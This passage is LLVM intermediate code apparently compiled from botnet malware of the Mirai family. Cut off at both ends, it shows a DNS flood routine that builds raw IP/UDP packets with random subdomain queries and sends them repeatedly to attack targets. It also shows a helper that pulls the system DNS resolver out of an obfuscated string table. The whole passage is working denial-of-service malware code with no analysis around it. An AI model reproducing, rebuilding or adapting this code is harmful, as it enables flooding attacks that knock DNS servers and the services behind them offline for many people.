.preheader121..preheader_crit_edge:               ; preds = %.preheader121
  %.pre137 = sext i32 %26 to i64
  br label %.preheader

.lr.ph128:                                        ; preds = %.preheader121
  %35 = zext i32 %.pre to i64
  %36 = sext i32 %26 to i64
  %37 = add nuw nsw i64 %35, 47
  %38 = add nsw i64 %37, %36
  %39 = trunc i64 %38 to i16
  %40 = icmp eq i8 %13, 0
  %41 = add nuw nsw i64 %35, 27
  %42 = add nsw i64 %41, %36
  %43 = trunc i64 %42 to i16
  %44 = add nsw i32 %26, 1
  %45 = icmp sgt i32 %26, 0
  %wide.trip.count = zext i32 %26 to i64
  br i1 %40, label %.lr.ph128.split.us.preheader, label %.lr.ph128.split.preheader

.lr.ph128.split.preheader:                        ; preds = %.lr.ph128
  %xtraiter146 = and i64 %wide.trip.count, 1
  %lcmp.mod147 = icmp eq i64 %xtraiter146, 0
  %46 = icmp eq i32 %26, 1
  br label %.lr.ph128.split

.lr.ph128.split.us.preheader:                     ; preds = %.lr.ph128
  %xtraiter = and i64 %wide.trip.count, 1
  %lcmp.mod = icmp eq i64 %xtraiter, 0
  %47 = icmp eq i32 %26, 1
  br label %.lr.ph128.split.us

.lr.ph128.split.us:                               ; preds = %.lr.ph128.split.us.preheader, %._crit_edge.us
  %48 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %49 = getelementptr inbounds i8, i8* %48, i64 20
  %50 = getelementptr inbounds i8, i8* %48, i64 28
  %51 = getelementptr inbounds i8, i8* %48, i64 40
  store i8 69, i8* %48, align 4
  %52 = getelementptr inbounds i8, i8* %48, i64 1
  store i8 %7, i8* %52, align 1
  %53 = call zeroext i16 @htons(i16 zeroext %39) #8
  %54 = getelementptr inbounds i8, i8* %48, i64 2
  %55 = bitcast i8* %54 to i16*
  store i16 %53, i16* %55, align 2
  %56 = call zeroext i16 @htons(i16 zeroext %9) #8
  %57 = getelementptr inbounds i8, i8* %48, i64 4
  %58 = bitcast i8* %57 to i16*
  store i16 %56, i16* %58, align 4
  %59 = getelementptr inbounds i8, i8* %48, i64 8
  store i8 %11, i8* %59, align 4
  %60 = getelementptr inbounds i8, i8* %48, i64 9
  store i8 17, i8* %60, align 1
  %61 = load i32, i32* @LOCAL_ADDR, align 4
  %62 = getelementptr inbounds i8, i8* %48, i64 12
  %63 = bitcast i8* %62 to i32*
  store i32 %61, i32* %63, align 4
  %64 = getelementptr inbounds i8, i8* %48, i64 16
  %65 = bitcast i8* %64 to i32*
  store i32 %23, i32* %65, align 4
  %66 = call zeroext i16 @htons(i16 zeroext %15) #8
  %67 = bitcast i8* %49 to i16*
  store i16 %66, i16* %67, align 2
  %68 = call zeroext i16 @htons(i16 zeroext %17) #8
  %69 = getelementptr inbounds i8, i8* %48, i64 22
  %70 = bitcast i8* %69 to i16*
  store i16 %68, i16* %70, align 2
  %71 = call zeroext i16 @htons(i16 zeroext %43) #8
  %72 = getelementptr inbounds i8, i8* %48, i64 24
  %73 = bitcast i8* %72 to i16*
  store i16 %71, i16* %73, align 2
  %74 = call zeroext i16 @htons(i16 zeroext %19) #8
  %75 = bitcast i8* %50 to i16*
  store i16 %74, i16* %75, align 2
  %76 = call zeroext i16 @htons(i16 zeroext 256) #8
  %77 = getelementptr inbounds i8, i8* %48, i64 30
  %78 = bitcast i8* %77 to i16*
  store i16 %76, i16* %78, align 2
  %79 = call zeroext i16 @htons(i16 zeroext 1) #8
  %80 = getelementptr inbounds i8, i8* %48, i64 32
  %81 = bitcast i8* %80 to i16*
  store i16 %79, i16* %81, align 2
  %82 = getelementptr inbounds i8, i8* %48, i64 41
  store i8 %21, i8* %51, align 1
  %83 = getelementptr inbounds i8, i8* %82, i64 %35
  %84 = getelementptr inbounds i8, i8* %83, i64 1
  call void @util_memcpy(i8* %84, i8* nonnull %22, i32 %44) #7
  br i1 %45, label %.lr.ph126.us.preheader, label %._crit_edge.us

.lr.ph126.us.preheader:                           ; preds = %.lr.ph128.split.us
  br i1 %lcmp.mod, label %.lr.ph126.us.prol.loopexit.unr-lcssa, label %.lr.ph126.us.prol.preheader

.lr.ph126.us.prol.preheader:                      ; preds = %.lr.ph126.us.preheader
  br label %.lr.ph126.us.prol

.lr.ph126.us.prol:                                ; preds = %.lr.ph126.us.prol.preheader
  %85 = load i8, i8* %22, align 1
  %86 = icmp eq i8 %85, 46
  br i1 %86, label %88, label %87

; <label>:87:                                     ; preds = %.lr.ph126.us.prol
  br label %90

; <label>:88:                                     ; preds = %.lr.ph126.us.prol
  store i8 0, i8* %83, align 1
  %89 = getelementptr inbounds i8, i8* %83, i64 1
  br label %90

; <label>:90:                                     ; preds = %88, %87
  %.1118.us.prol = phi i8* [ %89, %88 ], [ %83, %87 ]
  %.1.us.prol = phi i8 [ 0, %88 ], [ 1, %87 ]
  br label %.lr.ph126.us.prol.loopexit.unr-lcssa

.lr.ph126.us.prol.loopexit.unr-lcssa:             ; preds = %.lr.ph126.us.preheader, %90
  %.1118.us.lcssa.unr.ph = phi i8* [ %.1118.us.prol, %90 ], [ undef, %.lr.ph126.us.preheader ]
  %.1.us.lcssa.unr.ph = phi i8 [ %.1.us.prol, %90 ], [ undef, %.lr.ph126.us.preheader ]
  %indvars.iv.unr.ph = phi i64 [ 1, %90 ], [ 0, %.lr.ph126.us.preheader ]
  %.0114124.us.unr.ph = phi i8 [ %.1.us.prol, %90 ], [ 0, %.lr.ph126.us.preheader ]
  %.0117122.us.unr.ph = phi i8* [ %.1118.us.prol, %90 ], [ %83, %.lr.ph126.us.preheader ]
  br label %.lr.ph126.us.prol.loopexit

.lr.ph126.us.prol.loopexit:                       ; preds = %.lr.ph126.us.prol.loopexit.unr-lcssa
  br i1 %47, label %._crit_edge.us.loopexit, label %.lr.ph126.us.preheader.new

.lr.ph126.us.preheader.new:                       ; preds = %.lr.ph126.us.prol.loopexit
  br label %.lr.ph126.us

._crit_edge.us.loopexit.unr-lcssa:                ; preds = %297
  br label %._crit_edge.us.loopexit

._crit_edge.us.loopexit:                          ; preds = %.lr.ph126.us.prol.loopexit, %._crit_edge.us.loopexit.unr-lcssa
  %.1118.us.lcssa = phi i8* [ %.1118.us.lcssa.unr.ph, %.lr.ph126.us.prol.loopexit ], [ %.1118.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  %.1.us.lcssa = phi i8 [ %.1.us.lcssa.unr.ph, %.lr.ph126.us.prol.loopexit ], [ %.1.us.1, %._crit_edge.us.loopexit.unr-lcssa ]
  br label %._crit_edge.us

._crit_edge.us:                                   ; preds = %._crit_edge.us.loopexit, %.lr.ph128.split.us
  %.0117.lcssa.us = phi i8* [ %83, %.lr.ph128.split.us ], [ %.1118.us.lcssa, %._crit_edge.us.loopexit ]
  %.0114.lcssa.us = phi i8 [ 0, %.lr.ph128.split.us ], [ %.1.us.lcssa, %._crit_edge.us.loopexit ]
  store i8 %.0114.lcssa.us, i8* %.0117.lcssa.us, align 1
  %91 = getelementptr inbounds i8, i8* %83, i64 %36
  %92 = getelementptr inbounds i8, i8* %91, i64 2
  %93 = bitcast i8* %92 to i16*
  store i16 %79, i16* %93, align 2
  %94 = getelementptr inbounds i8, i8* %92, i64 2
  %95 = bitcast i8* %94 to i16*
  store i16 %79, i16* %95, align 2
  %96 = load i32, i32* %5, align 4
  %97 = add nsw i32 %96, 1
  store i32 %97, i32* %5, align 4
  %98 = icmp slt i32 %97, %33
  br i1 %98, label %.lr.ph128.split.us, label %.preheader.loopexit

.lr.ph126.us:                                     ; preds = %297, %.lr.ph126.us.preheader.new
  %indvars.iv = phi i64 [ %indvars.iv.unr.ph, %.lr.ph126.us.preheader.new ], [ %indvars.iv.next.1, %297 ]
  %.0114124.us = phi i8 [ %.0114124.us.unr.ph, %.lr.ph126.us.preheader.new ], [ %.1.us.1, %297 ]
  %.0117122.us = phi i8* [ %.0117122.us.unr.ph, %.lr.ph126.us.preheader.new ], [ %.1118.us.1, %297 ]
  %99 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv
  %100 = load i8, i8* %99, align 1
  %101 = icmp eq i8 %100, 46
  br i1 %101, label %104, label %102

; <label>:102:                                    ; preds = %.lr.ph126.us
  %103 = add i8 %.0114124.us, 1
  br label %.lr.ph126.us.1145

; <label>:104:                                    ; preds = %.lr.ph126.us
  store i8 %.0114124.us, i8* %.0117122.us, align 1
  %105 = getelementptr inbounds i8, i8* %83, i64 %indvars.iv
  %106 = getelementptr inbounds i8, i8* %105, i64 1
  br label %.lr.ph126.us.1145

.lr.ph126.us.1145:                                ; preds = %104, %102
  %.1118.us = phi i8* [ %106, %104 ], [ %.0117122.us, %102 ]
  %.1.us = phi i8 [ 0, %104 ], [ %103, %102 ]
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %107 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv.next
  %108 = load i8, i8* %107, align 1
  %109 = icmp eq i8 %108, 46
  br i1 %109, label %294, label %292

; <label>:110:                                    ; preds = %29
  %111 = call i32 @close(i32 %27) #7
  br label %291

.preheader.loopexit:                              ; preds = %._crit_edge.us
  br label %.preheader

.preheader.loopexit144:                           ; preds = %._crit_edge
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit144, %.preheader.loopexit, %.preheader121..preheader_crit_edge
  %.pre-phi138 = phi i64 [ %.pre137, %.preheader121..preheader_crit_edge ], [ %36, %.preheader.loopexit ], [ %36, %.preheader.loopexit144 ]
  %112 = and i32 %8, 65535
  %113 = icmp eq i32 %112, 65535
  %114 = and i32 %14, 65535
  %115 = icmp eq i32 %114, 65535
  %116 = and i32 %16, 65535
  %117 = icmp eq i32 %116, 65535
  %118 = and i32 %18, 65535
  %119 = icmp eq i32 %118, 65535
  %120 = add nuw nsw i32 %.pre, 27
  %121 = add i32 %120, %26
  %addconv130 = add nuw nsw i32 %.pre, 47
  %122 = zext i32 %addconv130 to i64
  %123 = add nsw i64 %122, %.pre-phi138
  br label %.loopexit

.lr.ph128.split:                                  ; preds = %.lr.ph128.split.preheader, %._crit_edge
  %124 = call noalias i8* @calloc(i64 1458, i64 1) #7
  %125 = getelementptr inbounds i8, i8* %124, i64 20
  %126 = getelementptr inbounds i8, i8* %124, i64 28
  %127 = getelementptr inbounds i8, i8* %124, i64 40
  store i8 69, i8* %124, align 4
  %128 = getelementptr inbounds i8, i8* %124, i64 1
  store i8 %7, i8* %128, align 1
  %129 = call zeroext i16 @htons(i16 zeroext %39) #8
  %130 = getelementptr inbounds i8, i8* %124, i64 2
  %131 = bitcast i8* %130 to i16*
  store i16 %129, i16* %131, align 2
  %132 = call zeroext i16 @htons(i16 zeroext %9) #8
  %133 = getelementptr inbounds i8, i8* %124, i64 4
  %134 = bitcast i8* %133 to i16*
  store i16 %132, i16* %134, align 4
  %135 = getelementptr inbounds i8, i8* %124, i64 8
  store i8 %11, i8* %135, align 4
  %136 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %137 = getelementptr inbounds i8, i8* %124, i64 6
  %138 = bitcast i8* %137 to i16*
  store i16 %136, i16* %138, align 2
  %139 = getelementptr inbounds i8, i8* %124, i64 9
  store i8 17, i8* %139, align 1
  %140 = load i32, i32* @LOCAL_ADDR, align 4
  %141 = getelementptr inbounds i8, i8* %124, i64 12
  %142 = bitcast i8* %141 to i32*
  store i32 %140, i32* %142, align 4
  %143 = getelementptr inbounds i8, i8* %124, i64 16
  %144 = bitcast i8* %143 to i32*
  store i32 %23, i32* %144, align 4
  %145 = call zeroext i16 @htons(i16 zeroext %15) #8
  %146 = bitcast i8* %125 to i16*
  store i16 %145, i16* %146, align 2
  %147 = call zeroext i16 @htons(i16 zeroext %17) #8
  %148 = getelementptr inbounds i8, i8* %124, i64 22
  %149 = bitcast i8* %148 to i16*
  store i16 %147, i16* %149, align 2
  %150 = call zeroext i16 @htons(i16 zeroext %43) #8
  %151 = getelementptr inbounds i8, i8* %124, i64 24
  %152 = bitcast i8* %151 to i16*
  store i16 %150, i16* %152, align 2
  %153 = call zeroext i16 @htons(i16 zeroext %19) #8
  %154 = bitcast i8* %126 to i16*
  store i16 %153, i16* %154, align 2
  %155 = call zeroext i16 @htons(i16 zeroext 256) #8
  %156 = getelementptr inbounds i8, i8* %124, i64 30
  %157 = bitcast i8* %156 to i16*
  store i16 %155, i16* %157, align 2
  %158 = call zeroext i16 @htons(i16 zeroext 1) #8
  %159 = getelementptr inbounds i8, i8* %124, i64 32
  %160 = bitcast i8* %159 to i16*
  store i16 %158, i16* %160, align 2
  %161 = getelementptr inbounds i8, i8* %124, i64 41
  store i8 %21, i8* %127, align 1
  %162 = getelementptr inbounds i8, i8* %161, i64 %35
  %163 = getelementptr inbounds i8, i8* %162, i64 1
  call void @util_memcpy(i8* %163, i8* nonnull %22, i32 %44) #7
  br i1 %45, label %.lr.ph126.preheader, label %._crit_edge

.lr.ph126.preheader:                              ; preds = %.lr.ph128.split
  br i1 %lcmp.mod147, label %.lr.ph126.prol.loopexit.unr-lcssa, label %.lr.ph126.prol.preheader

.lr.ph126.prol.preheader:                         ; preds = %.lr.ph126.preheader
  br label %.lr.ph126.prol

.lr.ph126.prol:                                   ; preds = %.lr.ph126.prol.preheader
  %164 = load i8, i8* %22, align 1
  %165 = icmp eq i8 %164, 46
  br i1 %165, label %167, label %166

; <label>:166:                                    ; preds = %.lr.ph126.prol
  br label %169

; <label>:167:                                    ; preds = %.lr.ph126.prol
  store i8 0, i8* %162, align 1
  %168 = getelementptr inbounds i8, i8* %162, i64 1
  br label %169

; <label>:169:                                    ; preds = %167, %166
  %.1118.prol = phi i8* [ %168, %167 ], [ %162, %166 ]
  %.1.prol = phi i8 [ 0, %167 ], [ 1, %166 ]
  br label %.lr.ph126.prol.loopexit.unr-lcssa

.lr.ph126.prol.loopexit.unr-lcssa:                ; preds = %.lr.ph126.preheader, %169
  %.1118.lcssa.unr.ph = phi i8* [ %.1118.prol, %169 ], [ undef, %.lr.ph126.preheader ]
  %.1.lcssa.unr.ph = phi i8 [ %.1.prol, %169 ], [ undef, %.lr.ph126.preheader ]
  %indvars.iv133.unr.ph = phi i64 [ 1, %169 ], [ 0, %.lr.ph126.preheader ]
  %.0114124.unr.ph = phi i8 [ %.1.prol, %169 ], [ 0, %.lr.ph126.preheader ]
  %.0117122.unr.ph = phi i8* [ %.1118.prol, %169 ], [ %162, %.lr.ph126.preheader ]
  br label %.lr.ph126.prol.loopexit

.lr.ph126.prol.loopexit:                          ; preds = %.lr.ph126.prol.loopexit.unr-lcssa
  br i1 %46, label %._crit_edge.loopexit, label %.lr.ph126.preheader.new

.lr.ph126.preheader.new:                          ; preds = %.lr.ph126.prol.loopexit
  br label %.lr.ph126

.lr.ph126:                                        ; preds = %303, %.lr.ph126.preheader.new
  %indvars.iv133 = phi i64 [ %indvars.iv133.unr.ph, %.lr.ph126.preheader.new ], [ %indvars.iv.next134.1, %303 ]
  %.0114124 = phi i8 [ %.0114124.unr.ph, %.lr.ph126.preheader.new ], [ %.1.1, %303 ]
  %.0117122 = phi i8* [ %.0117122.unr.ph, %.lr.ph126.preheader.new ], [ %.1118.1, %303 ]
  %170 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv133
  %171 = load i8, i8* %170, align 1
  %172 = icmp eq i8 %171, 46
  br i1 %172, label %173, label %176

; <label>:173:                                    ; preds = %.lr.ph126
  store i8 %.0114124, i8* %.0117122, align 1
  %174 = getelementptr inbounds i8, i8* %162, i64 %indvars.iv133
  %175 = getelementptr inbounds i8, i8* %174, i64 1
  br label %.lr.ph126.1148

; <label>:176:                                    ; preds = %.lr.ph126
  %177 = add i8 %.0114124, 1
  br label %.lr.ph126.1148

.lr.ph126.1148:                                   ; preds = %173, %176
  %.1118 = phi i8* [ %175, %173 ], [ %.0117122, %176 ]
  %.1 = phi i8 [ 0, %173 ], [ %177, %176 ]
  %indvars.iv.next134 = add nuw nsw i64 %indvars.iv133, 1
  %178 = getelementptr inbounds i8, i8* %22, i64 %indvars.iv.next134
  %179 = load i8, i8* %178, align 1
  %180 = icmp eq i8 %179, 46
  br i1 %180, label %300, label %298

._crit_edge.loopexit.unr-lcssa:                   ; preds = %303
  br label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph126.prol.loopexit, %._crit_edge.loopexit.unr-lcssa
  %.1118.lcssa = phi i8* [ %.1118.lcssa.unr.ph, %.lr.ph126.prol.loopexit ], [ %.1118.1, %._crit_edge.loopexit.unr-lcssa ]
  %.1.lcssa = phi i8 [ %.1.lcssa.unr.ph, %.lr.ph126.prol.loopexit ], [ %.1.1, %._crit_edge.loopexit.unr-lcssa ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.lr.ph128.split
  %.0117.lcssa = phi i8* [ %162, %.lr.ph128.split ], [ %.1118.lcssa, %._crit_edge.loopexit ]
  %.0114.lcssa = phi i8 [ 0, %.lr.ph128.split ], [ %.1.lcssa, %._crit_edge.loopexit ]
  store i8 %.0114.lcssa, i8* %.0117.lcssa, align 1
  %181 = getelementptr inbounds i8, i8* %162, i64 %36
  %182 = getelementptr inbounds i8, i8* %181, i64 2
  %183 = bitcast i8* %182 to i16*
  store i16 %158, i16* %183, align 2
  %184 = getelementptr inbounds i8, i8* %182, i64 2
  %185 = bitcast i8* %184 to i16*
  store i16 %158, i16* %185, align 2
  %186 = load i32, i32* %5, align 4
  %187 = add nsw i32 %186, 1
  store i32 %187, i32* %5, align 4
  %188 = icmp slt i32 %187, %33
  br i1 %188, label %.lr.ph128.split, label %.preheader.loopexit144

.loopexit.loopexit:                               ; preds = %217
  br label %.loopexit.backedge

.loopexit.loopexit143:                            ; preds = %266
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %34, label %.loopexit.backedge, label %.lr.ph

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit, %.loopexit.loopexit143
  br label %.loopexit

.lr.ph:                                           ; preds = %.loopexit
  br i1 %113, label %.lr.ph.split.us.preheader, label %.lr.ph.split.preheader

.lr.ph.split.preheader:                           ; preds = %.lr.ph
  br label %.lr.ph.split

.lr.ph.split.us.preheader:                        ; preds = %.lr.ph
  br label %.lr.ph.split.us

.lr.ph.split.us:                                  ; preds = %.lr.ph.split.us.preheader, %217
  %189 = call i32 @rand() #7
  %190 = srem i32 %189, 256
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds [256 x i8*], [256 x i8*]* @attack_udp_dns.dns_array, i64 0, i64 %191
  %193 = load i8*, i8** %192, align 8
  %194 = bitcast i8* %193 to %struct.iphdr*
  %195 = getelementptr inbounds i8, i8* %193, i64 20
  %196 = getelementptr inbounds i8, i8* %193, i64 28
  %197 = getelementptr inbounds i8, i8* %193, i64 41
  %198 = call i32 @rand_next() #7
  %199 = trunc i32 %198 to i16
  %200 = getelementptr inbounds i8, i8* %193, i64 4
  %201 = bitcast i8* %200 to i16*
  store i16 %199, i16* %201, align 4
  br i1 %115, label %202, label %206

; <label>:202:                                    ; preds = %.lr.ph.split.us
  %203 = call i32 @rand_next() #7
  %204 = trunc i32 %203 to i16
  %205 = bitcast i8* %195 to i16*
  store i16 %204, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %.lr.ph.split.us
  br i1 %117, label %207, label %212

; <label>:207:                                    ; preds = %206
  %208 = call i32 @rand_next() #7
  %209 = trunc i32 %208 to i16
  %210 = getelementptr inbounds i8, i8* %193, i64 22
  %211 = bitcast i8* %210 to i16*
  store i16 %209, i16* %211, align 2
  br label %212

; <label>:212:                                    ; preds = %207, %206
  br i1 %119, label %213, label %217

; <label>:213:                                    ; preds = %212
  %214 = call i32 @rand_next() #7
  %215 = trunc i32 %214 to i16
  %216 = bitcast i8* %196 to i16*
  store i16 %215, i16* %216, align 2
  br label %217

; <label>:217:                                    ; preds = %213, %212
  %218 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %197, i32 %.pre) #7
  %219 = getelementptr inbounds i8, i8* %193, i64 10
  %220 = bitcast i8* %219 to i16*
  store i16 0, i16* %220, align 2
  %221 = bitcast i8* %193 to i16*
  %222 = call zeroext i16 @checksum_generic(i16* %221, i32 20) #7
  store i16 %222, i16* %220, align 2
  %223 = getelementptr inbounds i8, i8* %193, i64 26
  %224 = bitcast i8* %223 to i16*
  store i16 0, i16* %224, align 2
  %225 = getelementptr inbounds i8, i8* %193, i64 24
  %226 = bitcast i8* %225 to i16*
  %227 = load i16, i16* %226, align 2
  %228 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %194, i8* %195, i16 zeroext %227, i32 %121) #7
  store i16 %228, i16* %224, align 2
  %229 = load i32, i32* %5, align 4
  %230 = sext i32 %229 to i64
  %231 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %230, i32 0, i32 2, i32 0
  store i32 %23, i32* %231, align 4
  %232 = getelementptr inbounds i8, i8* %193, i64 22
  %233 = bitcast i8* %232 to i16*
  %234 = load i16, i16* %233, align 2
  %235 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %230, i32 0, i32 1
  store i16 %234, i16* %235, align 2
  %236 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %230, i32 0
  %237 = bitcast %struct.sockaddr_in* %236 to %struct.sockaddr*
  %238 = call i64 @sendto(i32 %27, i8* %193, i64 %123, i32 16384, %struct.sockaddr* %237, i32 16) #7
  %239 = load i32, i32* %5, align 4
  %240 = add nsw i32 %239, 1
  store i32 %240, i32* %5, align 4
  %241 = icmp slt i32 %240, %33
  br i1 %241, label %.lr.ph.split.us, label %.loopexit.loopexit

.lr.ph.split:                                     ; preds = %.lr.ph.split.preheader, %266
  %242 = call i32 @rand() #7
  %243 = srem i32 %242, 256
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds [256 x i8*], [256 x i8*]* @attack_udp_dns.dns_array, i64 0, i64 %244
  %246 = load i8*, i8** %245, align 8
  %247 = bitcast i8* %246 to %struct.iphdr*
  %248 = getelementptr inbounds i8, i8* %246, i64 20
  %249 = getelementptr inbounds i8, i8* %246, i64 28
  %250 = getelementptr inbounds i8, i8* %246, i64 41
  br i1 %115, label %251, label %255

; <label>:251:                                    ; preds = %.lr.ph.split
  %252 = call i32 @rand_next() #7
  %253 = trunc i32 %252 to i16
  %254 = bitcast i8* %248 to i16*
  store i16 %253, i16* %254, align 2
  br label %255

; <label>:255:                                    ; preds = %251, %.lr.ph.split
  br i1 %117, label %256, label %261

; <label>:256:                                    ; preds = %255
  %257 = call i32 @rand_next() #7
  %258 = trunc i32 %257 to i16
  %259 = getelementptr inbounds i8, i8* %246, i64 22
  %260 = bitcast i8* %259 to i16*
  store i16 %258, i16* %260, align 2
  br label %261

; <label>:261:                                    ; preds = %256, %255
  br i1 %119, label %262, label %266

; <label>:262:                                    ; preds = %261
  %263 = call i32 @rand_next() #7
  %264 = trunc i32 %263 to i16
  %265 = bitcast i8* %249 to i16*
  store i16 %264, i16* %265, align 2
  br label %266

; <label>:266:                                    ; preds = %262, %261
  %267 = call i32 (i8*, i32, ...) bitcast (i32 (...)* @rand_alphastr to i32 (i8*, i32, ...)*)(i8* %250, i32 %.pre) #7
  %268 = getelementptr inbounds i8, i8* %246, i64 10
  %269 = bitcast i8* %268 to i16*
  store i16 0, i16* %269, align 2
  %270 = bitcast i8* %246 to i16*
  %271 = call zeroext i16 @checksum_generic(i16* %270, i32 20) #7
  store i16 %271, i16* %269, align 2
  %272 = getelementptr inbounds i8, i8* %246, i64 26
  %273 = bitcast i8* %272 to i16*
  store i16 0, i16* %273, align 2
  %274 = getelementptr inbounds i8, i8* %246, i64 24
  %275 = bitcast i8* %274 to i16*
  %276 = load i16, i16* %275, align 2
  %277 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %247, i8* %248, i16 zeroext %276, i32 %121) #7
  store i16 %277, i16* %273, align 2
  %278 = load i32, i32* %5, align 4
  %279 = sext i32 %278 to i64
  %280 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %279, i32 0, i32 2, i32 0
  store i32 %23, i32* %280, align 4
  %281 = getelementptr inbounds i8, i8* %246, i64 22
  %282 = bitcast i8* %281 to i16*
  %283 = load i16, i16* %282, align 2
  %284 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %279, i32 0, i32 1
  store i16 %283, i16* %284, align 2
  %285 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %279, i32 0
  %286 = bitcast %struct.sockaddr_in* %285 to %struct.sockaddr*
  %287 = call i64 @sendto(i32 %27, i8* %246, i64 %123, i32 16384, %struct.sockaddr* %286, i32 16) #7
  %288 = load i32, i32* %5, align 4
  %289 = add nsw i32 %288, 1
  store i32 %289, i32* %5, align 4
  %290 = icmp slt i32 %289, %33
  br i1 %290, label %.lr.ph.split, label %.loopexit.loopexit143

; <label>:291:                                    ; preds = %25, %4, %110
  ret void

; <label>:292:                                    ; preds = %.lr.ph126.us.1145
  %293 = add i8 %.1.us, 1
  br label %297

; <label>:294:                                    ; preds = %.lr.ph126.us.1145
  store i8 %.1.us, i8* %.1118.us, align 1
  %295 = getelementptr inbounds i8, i8* %83, i64 %indvars.iv.next
  %296 = getelementptr inbounds i8, i8* %295, i64 1
  br label %297

; <label>:297:                                    ; preds = %294, %292
  %.1118.us.1 = phi i8* [ %296, %294 ], [ %.1118.us, %292 ]
  %.1.us.1 = phi i8 [ 0, %294 ], [ %293, %292 ]
  %indvars.iv.next.1 = add nsw i64 %indvars.iv, 2
  %exitcond.1 = icmp eq i64 %indvars.iv.next.1, %wide.trip.count
  br i1 %exitcond.1, label %._crit_edge.us.loopexit.unr-lcssa, label %.lr.ph126.us

; <label>:298:                                    ; preds = %.lr.ph126.1148
  %299 = add i8 %.1, 1
  br label %303

; <label>:300:                                    ; preds = %.lr.ph126.1148
  store i8 %.1, i8* %.1118, align 1
  %301 = getelementptr inbounds i8, i8* %162, i64 %indvars.iv.next134
  %302 = getelementptr inbounds i8, i8* %301, i64 1
  br label %303

; <label>:303:                                    ; preds = %300, %298
  %.1118.1 = phi i8* [ %302, %300 ], [ %.1118, %298 ]
  %.1.1 = phi i8 [ 0, %300 ], [ %299, %298 ]
  %indvars.iv.next134.1 = add nsw i64 %indvars.iv133, 2
  %exitcond136.1 = icmp eq i64 %indvars.iv.next134.1, %wide.trip.count
  br i1 %exitcond136.1, label %._crit_edge.loopexit.unr-lcssa, label %.lr.ph126
}

; Function Attrs: noinline nounwind uwtable
define internal fastcc i32 @get_dns_resolver() unnamed_addr #0 {
  %1 = alloca [2048 x i8], align 16
  %2 = alloca [32 x i8], align 16
  tail call void @table_unlock_val(i8 zeroext 46) #7
  %3 = tail call i8* @table_retrieve_val(i32 46, i32* null) #7
  %4 = tail call i32 (i8*, i32, ...) @open(i8* %3, i32 0) #7
  tail call void @table_lock_val(i8 zeroext 46) #7
  %5 = icmp sgt i32 %4, -1
  br i1 %5, label %6, label %.loopexit

; <label>:6:                                      ; preds = %0
  %7 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 0
  %8 = call i64 @read(i32 %4, i8* nonnull %7, i64 2048) #7
  %9 = trunc i64 %8 to i32
  %10 = tail call i32 @close(i32 %4) #7
  tail call void @table_unlock_val(i8 zeroext 47) #7
  %11 = tail call i8* @table_retrieve_val(i32 47, i32* null) #7
  %12 = call i32 @util_stristr(i8* nonnull %7, i32 %9, i8* %11) #7
  call void @table_lock_val(i8 zeroext 47) #7
  %13 = icmp ne i32 %12, -1
  %14 = icmp slt i32 %12, %9
  %or.cond = and i1 %13, %14
  br i1 %or.cond, label %.lr.ph, label %.loopexit

.lr.ph:                                           ; preds = %6
  %.old = add nsw i32 %9, -1
  %15 = sext i32 %12 to i64
  %sext = shl i64 %8, 32
  %16 = ashr exact i64 %sext, 32
  br label %17

; <label>:17:                                     ; preds = %.lr.ph, %35
  %indvars.iv = phi i64 [ %15, %.lr.ph ], [ %indvars.iv.next, %35 ]
  %.02633 = phi i8 [ 0, %.lr.ph ], [ %.2, %35 ]
  %18 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %indvars.iv
  %19 = load i8, i8* %18, align 1
  %20 = icmp eq i8 %.02633, 0
  br i1 %20, label %21, label %22

; <label>:21:                                     ; preds = %17
  switch i8 %19, label %22 [
    i8 32, label %35
    i8 9, label %35
  ]

; <label>:22:                                     ; preds = %21, %17
  %.1 = phi i8 [ %.02633, %17 ], [ 1, %21 ]
  %23 = icmp eq i8 %19, 46
  %24 = trunc i64 %indvars.iv to i32
  br i1 %23, label %28, label %25

; <label>:25:                                     ; preds = %22
  %.off = add i8 %19, -48
  %26 = icmp ugt i8 %.off, 9
  %27 = icmp eq i32 %24, %.old
  %or.cond29 = or i1 %27, %26
  br i1 %or.cond29, label %.critedge, label %35

; <label>:28:                                     ; preds = %22
  %.old28 = icmp eq i32 %24, %.old
  br i1 %.old28, label %.critedge, label %35

.critedge:                                        ; preds = %28, %25
  %.02731.lcssa = phi i32 [ %.old, %28 ], [ %24, %25 ]
  %29 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 0
  %30 = getelementptr inbounds [2048 x i8], [2048 x i8]* %1, i64 0, i64 %15
  %31 = sub nsw i32 %.02731.lcssa, %12
  call void @util_memcpy(i8* nonnull %29, i8* %30, i32 %31) #7
  %32 = sext i32 %31 to i64
  %33 = getelementptr inbounds [32 x i8], [32 x i8]* %2, i64 0, i64 %32
  store i8 0, i8* %33, align 1
  %34 = call i32 @inet_addr(i8* nonnull %29) #7
  br label %47

; <label>:35:                                     ; preds = %25, %21, %21, %28
